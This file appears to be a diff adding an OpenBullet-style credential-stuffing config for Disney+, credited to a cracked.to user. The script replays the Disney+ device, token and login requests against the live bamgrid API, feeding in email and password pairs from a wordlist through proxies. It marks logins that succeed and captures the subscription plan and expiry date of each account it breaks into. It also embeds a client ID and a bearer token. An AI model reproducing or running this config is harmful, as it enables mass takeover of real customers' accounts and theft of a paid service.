@@ -1,0 +1,184 @@
+[SETTINGS]
+{
+  "Name": "disneyplus_rolex",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-11-13T13:30:09.5885581+05:30",
+  "AdditionalInfo": "Bots : 100-150 . Credits : rolex0001",
+  "Author": "rolex0001",
+  "Version": "1.1.4",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "Email",
+  "AllowedWordlist2": "Email",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION Constant "disney-svod-3d9324fc" -> VAR "clientid" 
+
+FUNCTION Constant "ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84" -> VAR "bearer" 
+
+REQUEST POST "https://global.edge.bamgrid.com/devices" 
+  CONTENT "{\"deviceFamily\":\"browser\",\"applicationRuntime\":\"chrome\",\"deviceProfile\":\"windows\",\"attributes\":{}}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <bearer>" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "Request blocked" 
+
+PARSE "<SOURCE>" JSON "assertion" -> VAR "token" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=<token>&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <bearer>" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "unauthorized_client" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "accesstoken" 
+
+REQUEST POST "https://global.edge.bamgrid.com/idp/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <accesstoken>" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "bad-credentials" 
+  KEYCHAIN Success OR 
+    KEY "Bearer" 
+
+PARSE "<SOURCE>" JSON "id_token" -> VAR "idtoken" 
+
+REQUEST POST "https://global.edge.bamgrid.com/accounts/grant" 
+  CONTENT "{\"id_token\":\"<idtoken>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <accesstoken>" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "assertion" -> VAR "assertion" 
+
+REQUEST POST "https://global.edge.bamgrid.com/token" 
+  CONTENT "grant_type=urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange&latitude=0&longitude=0&platform=browser&subject_token=<assertion>&subject_token_type=urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: <clientid>" 
+  HEADER "authorization: Bearer <bearer>" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "access_token" -> VAR "accesstoken" 
+
+REQUEST GET "https://global.edge.bamgrid.com/subscriptions" 
+  
+  HEADER "Host: global.edge.bamgrid.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "x-bamsdk-platform: windows" 
+  HEADER "Origin: https://www.disneyplus.com" 
+  HEADER "x-bamsdk-client-id: disney-svod-3d9324fc" 
+  HEADER "authorization: Bearer <accesstoken>" 
+  HEADER "content-type: application/json; charset=utf-8" 
+  HEADER "x-bamsdk-version: 4.2" 
+  HEADER "accept: application/json; charset=utf-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Referer: https://www.disneyplus.com/login/password" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+
+PARSE "<SOURCE>" JSON "name" -> CAP "Subscription" 
+
+PARSE "<SOURCE>" JSON "expirationDate" -> CAP "Expiration" "" " | Credits : parnex" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<SOURCE>" DoesNotContain "name" 
+    KEY "<Subscription>" EqualTo "" 
+
+//made by rolex0001	
+//cracked.to : https://cracked.to/rolex0001
+
